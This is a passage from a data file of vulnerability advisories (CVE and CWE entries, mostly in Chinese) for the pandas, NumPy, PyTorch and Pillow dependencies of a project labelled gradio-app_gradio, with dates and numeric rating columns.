NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,pandas,,True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
gradio-app_gradio,pandas,,True,,CWE-89,2023-09-03,"## Overview
[pandas](https://pypi.org/project/pandas/) is a Python package providing data structures designed to make working with structured (tabular, multidimensional, potentially heterogeneous) and time series data both easy and intuitive.

Affected versions of this package are vulnerable to SQL Injection via `sql.py`, due to improper input sanitization.
## Remediation
Upgrade `pandas` to version 0.16.0 or higher.
## References
- [GitHub Commit](https://github.com/pandas-dev/pandas/commit/a774ee84485412459f7205cccd87b639022afd07)
- [GitHub PR](https://github.com/pandas-dev/pandas/pull/8986)
",2,2
gradio-app_gradio,pandas,,True,CVE-2024-9880,CWE-77,,Pandas是一个开源的Python数据分析与处理库，提供高效的数据结构与数据分析工具。此漏洞存在于pandas.DataFrame.query()函数，攻击者可以通过构造恶意查询来执行任意命令。该漏洞源于对用户输入验证不足，特别是在使用'python'引擎时，导致可能的远程命令执行。,2,1
gradio-app_gradio,pandas,,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,torch,,True,CVE-2022-45907,CWE-94,2022-11-26,PyTorch是一个开源机器学习框架，提供张量计算、构建神经网络等功能。其torch.jit.annotations.parse_type_line组件存在代码注入漏洞，原因是对eval的使用不安全，导致潜在的任意代码执行。,1,2
gradio-app_gradio,torch,,True,CVE-2024-31580,CWE-122,2024-04-17,PyTorch是一个开源的Python包，主要用于张量计算和动态神经网络，并且具有强大的GPU加速功能。在v2.2.0之前的版本中，/runtime/vararg_functions.cpp组件中存在堆缓冲区溢出漏洞。由于函数的大小检查不当，攻击者可以通过提供精心构造的输入导致拒绝服务(DoS)，甚至可能执行任意代码。,2,0
gradio-app_gradio,torch,,True,CVE-2024-31583,CWE-416,2024-04-17,PyTorch 是一个以开源方式提供的 Python 库，专门用于神经网络构建与张量计算，具备强大的 GPU 加速能力。此漏洞涉及内存的释放后重用，位于 torch/csrc/jit/mobile/interpreter.cpp 组件中，由于内存管理不当可能导致此问题。攻击者可通过该漏洞执行任意代码或引发拒绝服务攻击。,2,0
gradio-app_gradio,torch,,True,CVE-2024-48063,CWE-502,2024-10-29,<p>PyTorch是一个由PyTorch开源社区提供的常用机器学习框架，广泛应用于深度学习和人工智能开发。此漏洞在PyTorch版本2.4.1及之前的版本中发现，该漏洞源于用于分布式RPC任务的RemoteModule模块。当应用程序允许从未经验证的来源加载和执行代码时，会导致远程代码执行漏洞。此漏洞会使攻击者能够在没有适当权限或安全审查的情况下执行任意代码。</p>,1,1
gradio-app_gradio,torch,,True,CVE-2025-3730,CWE-404,2025-04-16,PyTorch是一个广泛使用的开源深度学习框架，其提供了动态神经网络的构建和强力的GPU加速支持。该框架中的torch.nn.functional.ctc_loss函数在处理输入为空的张量时，会在文件 aten/src/ATen/native/LossCTC.cpp中引发拒绝服务漏洞。攻击者可以通过触发该漏洞使得系统崩溃，导致服务不可用。,3,0
gradio-app_gradio,torch,,True,CVE-2024-7804,CWE-502,,PyTorch 是一个开源的 Python 深度学习框架，广泛用于机器学习和人工智能应用。该框架的 RPC 组件 (torch.distributed.rpc) 在 2.3.1 及其之前的版本中存在反序列化漏洞。该漏洞源于在反序列化 PythonUDF 对象时缺乏安全验证，攻击者能够通过发送恶意序列化的 PythonUDF 对象来远程执行任意代码，从而在主节点上实现远程代码执行 (RCE)。,1,1
gradio-app_gradio,torch,,True,CVE-2025-32434,CWE-502,2025-04-18,PyTorch 是一个用于深度学习的 Python 包，提供强大的 GPU 加速和自动微分能力。该漏洞存在于 PyTorch 2.5.1 及之前的版本中。当用户使用 torch.load 方法并将 weights_only 参数设置为 True 时，攻击者可以通过构造恶意模型文件强制调用 legacy_load 方法，从而实现远程命令执行，即使官方文档认为在此模式下是安全的。漏洞的根本原因在于反序列化过程中缺乏充分的安全验证。,1,1
gradio-app_gradio,torch,,True,CVE-2025-2953,CWE-404,2025-03-30,PyTorch 是一个深度学习框架，提供了动态神经网络和张量计算功能。该组件中受影响的函数 torch.mkldnn_max_pool2d 存在一个拒绝服务漏洞。这是由于在处理张量过程中发生了不当的资源关闭或释放，可能导致系统崩溃。本地攻击者可以通过特制输入触发此漏洞，导致服务中断。,3,0
gradio-app_gradio,torch,,True,CVE-2024-31584,CWE-125,2024-04-19,"PyTorch是PyTorch开源的一个 Python 包。
Pytorch v2.2.0之前版本存在安全漏洞，该漏洞源于组件 torch/csrc/jit/mobile/flatbuffer_loader.cpp存在越界读取漏洞。",3,0
gradio-app_gradio,torch,,True,CVE-2025-55553,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，主要用于深度学习模型的开发和训练。组件 proxy_tensor.py 是 PyTorch 的一部分，负责处理张量代理操作。此漏洞因组件 proxy_tensor.py 中存在的语法错误导致，攻击者可以通过触发该错误使目标系统进入不可用状态，从而造成拒绝服务（DoS）。利用该漏洞无需复杂的技术手段，可能通过特定的输入数据引发异常错误，从而导致服务中断。,3,2
gradio-app_gradio,torch,,True,CVE-2025-55560,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持多种机器学习任务和模型训练。该漏洞影响 PyTorch v2.7.0，当模型使用了 `torch.Tensor.to_sparse()` 和 `torch.Tensor.to_dense()` 方法并通过 Inductor 编译时，可能会导致拒绝服务 (DoS)。漏洞成因可能与 Inductor 编译器在处理稀疏与密集张量转换时出现的内存或计算资源耗尽问题有关。攻击者可以通过特制的模型触发该问题，从而使系统无法正常响应。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55558,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，通常用于构建和训练神经网络。该框架支持多种模块和操作，包括 torch.nn.Conv2d（二维卷积层）、torch.nn.functional.hardshrink（硬收缩激活函数）以及 torch.Tensor.view 和 torch.mv（矩阵向量乘法）。Inductor 是 PyTorch 的编译器部分，负责将模型代码编译为高效运行的计算图。在 PyTorch v2.7.0 中，当包含上述模块的模型经过 Inductor 编译时，会触发缓冲区溢出问题。缓冲区溢出通常是由于代码中对内存管理不当或缺乏边界检查导致的，这可能会导致存储数据的内存被过度写入，从而破坏程序的正常运行。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55557,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于构建和训练神经网络。torch.cummin 是 PyTorch 中的一个函数，用于计算张量的逐元素累积最小值。Inductor 是 PyTorch 的一个编译器后端，用于优化模型运行性能。在 PyTorch v2.7.0 中，当模型包含 torch.cummin 函数并使用 Inductor 编译时，会触发 Name Error。此错误可能导致系统无法正常运行，进而引发拒绝服务（DoS）。漏洞的成因可能是 Inductor 编译器在处理 torch.cummin 函数时未正确处理某些变量或名称解析，导致程序在运行时崩溃。,3,2
gradio-app_gradio,torch,,True,CVE-2025-46148,CWE-1284,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持动态计算图和自动梯度计算，用于构建和训练神经网络。nn.PairwiseDistance 是 PyTorch 中的一个模块，主要用于计算向量之间的距离。在 PyTorch 2.6.0 及之前的版本中，当启用 eager 模式时，该模块在计算 p=2 的距离时会产生错误结果。该问题可能由于实现中的算法逻辑错误或数据处理方式不当导致。,4,2
gradio-app_gradio,torch,,True,CVE-2025-2149,CWE-665,2025-03-10,<p>PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。受影响的组件是量化 Sigmoid 模块中的 nnq_Sigmoid 函数。PyTorch 的量化机制旨在减少模型的大小并提高推理速度，其中 nnq_Sigmoid 函数是用于激活函数的量化实现。漏洞的根本原因在于对参数 scale/zero_point 的处理不当，导致该组件的初始化过程发生错误。这种处理不当可能导致量化参数在初始化过程中被错误设置，进而影响模型的精度或功能。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-2148,CWE-119,2025-03-10,<p>PyTorch 是一个用于机器学习的开源 Python 库，广泛应用于深度学习模型的构建与训练。此漏洞出现在 PyTorch 2.6.0+cu124 版本的 torch.ops.profiler._call_end_callbacks_on_jit_fut 函数中，该函数处理过程中由于输入参数 None 导致内存损坏。这是一种缓冲区错误，可能由于未正确处理输入而导致不安全的内存操作。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-3121,CWE-119,2025-04-02,<p>PyTorch是一个开源的机器学习框架，广泛用于深度学习模型的开发和训练。该框架的2.6.0版本中，torch.jit.jit_module_from_flatbuffer函数存在内存损坏问题，导致缓冲区错误。此漏洞源于函数在处理flatbuffer的数据时没有正确管理内存，可能引发内存溢出或损坏，从而影响系统稳定性。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2998,CWE-119,2025-03-31,<p>PyTorch 是一个开源的深度学习框架，广泛用于各种机器学习和深度学习项目。该漏洞影响了 PyTorch 版本 2.6.0 中的函数 torch.nn.utils.rnn.pad_packed_sequence。PyTorch 提供丰富的神经网络构件与优化工具，帮助开发者构建复杂的深度学习模型。在该漏洞中，由于函数在处理输入时未进行适当的长度验证，导致出现内存损坏问题。这种处理不当使得本地用户有机会通过特定输入数据触发内存操作异常，导致内存访问错误。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2999,CWE-119,2025-03-31,<p>PyTorch 是一个开源的机器学习框架，提供了深度学习所需的核心功能。此漏洞影响了 PyTorch 2.6.0 版本中的 torch.nn.utils.rnn.unpack_sequence 函数。由于该函数在处理内存操作时存在不当处理，导致出现内存损坏从而引发缓冲区溢出问题。漏洞成因根本于对输入数据的长度大小缺乏正确验证，可能导致系统的内存被意外覆盖或破坏。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3001,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的开源深度学习框架，支持用于科学研究和商业应用的复杂张量计算和自动求导特性。该漏洞出现在 PyTorch 2.6.0 版本的 torch.lstm_cell 函数中，由于该函数未能正确验证输入数据的长度大小，攻击者可以通过操控输入数据导致内存损坏。由于内存地址定位错误或指针操作不当，使得进程内存中相邻区域可能被篡改或控制，进而引发程序异常或恶意代码执行。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3000,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的深度学习框架，提供自动求导和灵活的计算图功能。漏洞存在于 PyTorch 2.6.0 的 torch.jit.script 函数中，导致内存损坏。此漏洞是由于函数未能正确验证输入数据的长度大小，引发缓冲区溢出，从而导致内存损坏和潜在的代码执行风险。</p>,3,0
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,Pillow,,True,,,2023-10-05,"## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-56pw-mpj4-fxww. This link is maintained to preserve external references.

## Original Description
Pillow versions before v10.0.1 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). Pillow v10.0.1 upgrades the bundled libwebp binary to v1.3.2.",2,-2
gradio-app_gradio,Pillow,,True,,CWE-400,2021-04-24,"### Impact
_Pillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for a BLP container, and thus an attempted memory allocation can be very large._

### Patches
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### Workarounds
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### References
https://nvd.nist.gov/vuln/detail/CVE-2021-27921

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [example link to repo](http://example.com)
* Email us at [example email address](mailto:example@example.com)",2,2
gradio-app_gradio,Pillow,,True,,CWE-400,2022-03-12,"JpegImagePlugin may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder.

If the EOF marker is not detected as such however, this could lead to an infinite loop where JpegImagePlugin keeps trying to end the file.",4,-2
gradio-app_gradio,Pillow,,True,CVE-2022-45198,CWE-409,2022-11-14,"Pillow是一款基于Python的图像处理库。
Pillow 9.2.0之前版本存在安全漏洞，该漏洞源于对高度压缩的GIF数据处理不当。",2,2
gradio-app_gradio,Pillow,,True,CVE-2020-10994,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/Jpeg2KDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2016-4009,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/Resample.c文件中的‘ImagingResampleHorizontal’函数存在整数溢出漏洞。远程攻击者可借助负的‘new’的大小值利用该漏洞造成拒绝服务（基于堆的缓冲区溢出）。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-11538,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.0.0及之前版本中的libImaging/SgiRleDecode.c文件的SGI图像文件的处理存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",1,0
gradio-app_gradio,Pillow,,True,CVE-2021-27923,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-27922,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-27921,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25290,CWE-787,2021-03-11,<p>Pillow是一款基于Python的图像处理库。 Pillow 8.1.1之前版本存在安全漏洞。该漏洞源于在TiffDecode.c中存在一个大小无效的负偏移memcpy。</p>,2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25293,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1版本之前存在安全漏洞。该漏洞源于SGIRleDecode.c中存在越界读取。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25291,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于TiffDecode.c在TiffreadRGBATile中通过无效的title越界读取。",2,2
gradio-app_gradio,Pillow,,True,CVE-2020-35653,CWE-125,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码一个精心制作的PCX文件时，PoxDecode有一个缓冲区过读，因为缓冲区计算信任用户提供的stride值。",2,0
gradio-app_gradio,Pillow,,True,,CWE-78,2020-11-02,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Command Injection in filenames that contain single quotes via `load_djpeg`.
## Remediation
Upgrade `Pillow` to version 2.5.0 or higher.
## References
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/748)
- [Pillow Changelog](https://github.com/python-pillow/Pillow/blob/master/CHANGES.rst#250-2014-07-01)
",1,0
gradio-app_gradio,Pillow,,True,CVE-2020-10378,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2020-10177,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2020-5312,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制PCX文件利用该漏洞在系统上执行任意代码。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-5311,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/SgiRleDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制SGI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-5313,CWE-125,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制FLI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",2,0
gradio-app_gradio,Pillow,,True,CVE-2019-16865,CWE-770,2019-10-04,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.0之前版本中存在安全漏洞。攻击者可利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2016-9189,CWE-190,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可利用该漏洞获取敏感信息。",3,0
gradio-app_gradio,Pillow,,True,CVE-2016-9190,CWE-284,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可通过使用‘crafted image file’方法利用该漏洞执行任意代码。",2,0
gradio-app_gradio,Pillow,,True,CVE-2016-0775,CWE-119,2016-04-13,"Pillow是一款基于Python的图像处理库。
Pillow 3.1.1之前版本的libImaging/FliDecode.c文件中的‘ImagingFliDecode’函数存在缓冲区错误漏洞。远程攻击者可借助特制的FLI文件利用该漏洞造成拒绝服务（崩溃）。",2,0
gradio-app_gradio,Pillow,,True,CVE-2016-2533,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本和PIL 1.1.7及之前版本的PcdDecode.c文件中的‘ImagingPcdDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的PhotoCD文件利用该漏洞造成拒绝服务（崩溃）。",2,0
gradio-app_gradio,Pillow,,True,CVE-2014-1932,CWE-59,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py文件的‘load_djpeg’函数；EpsImagePlugin.py文件的‘Ghostscript’函数；IptcImagePlugin.py文件的‘load’函数；Image.py文件的‘_copy’函数存在安全漏洞，该漏洞源于程序没有正确创建临时文件。本地攻击者可通过对临时文件的符号链接攻击利用该漏洞覆盖任意文件，获取敏感信息。",2,0
gradio-app_gradio,Pillow,,True,CVE-2014-1933,CWE-264,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py和EpsImagePlugin.py脚本存在安全漏洞，该漏洞源于程序在命令行上使用临时文件名。本地攻击者可利用该漏洞实施符号链接攻击。",3,0
gradio-app_gradio,Pillow,,True,CVE-2016-0740,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/TiffDecode.c文件中的‘ImagingLibTiffDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的TIFF文件利用该漏洞覆盖内存。",3,0
gradio-app_gradio,Pillow,,True,CVE-2020-10379,CWE-120,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/TiffDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2022-24303,CWE-22,2022-02-03,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.1之前版本存在输入验证错误漏洞，该漏洞源于产品的remove操作未验证用户输入数据。攻击者可通过该漏洞利用输入命令来修改或删除预期的命令。",2,2
gradio-app_gradio,Pillow,,True,CVE-2022-22815,CWE-665,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 不正确地初始化 ImagePath.Path。",3,2
gradio-app_gradio,Pillow,,True,CVE-2022-22816,CWE-125,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 在 ImagePath.Path 初始化期间有一个缓冲区过度读取。",3,2
gradio-app_gradio,Pillow,,True,CVE-2022-22817,CWE-94,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 PIL.ImageMath.eval 允许评估任意表达式，例如使用 Python exec 方法的表达式。",1,2
gradio-app_gradio,Pillow,,True,,CWE-400,2022-01-04,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Denial of Service (DoS). The `JpegImagePlugin` may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder. If the EOF marker is not detected as such, this can lead to an infinite loop where `JpegImagePlugin` keeps trying to end the file.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `Pillow` to version 9.0.0 or higher.
## References
- [GitHub Commit](https://github.com/python-pillow/Pillow/pull/5921/commits/1059eb537639925c96d3245dcd73c106d4266c83)
- [GitHub Issue](https://github.com/python-pillow/Pillow/issues/5864#issuecomment-1003788821)
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/5921)
- [Release Notes](https://pillow.readthedocs.io/en/stable/releasenotes/9.0.0.html#ensure-jpegimageplugin-stops-at-the-end-of-a-truncated-file)
",3,0
gradio-app_gradio,Pillow,,True,CVE-2021-34552,CWE-120,2021-07-13,"Pillow是一款基于Python的图像处理库。
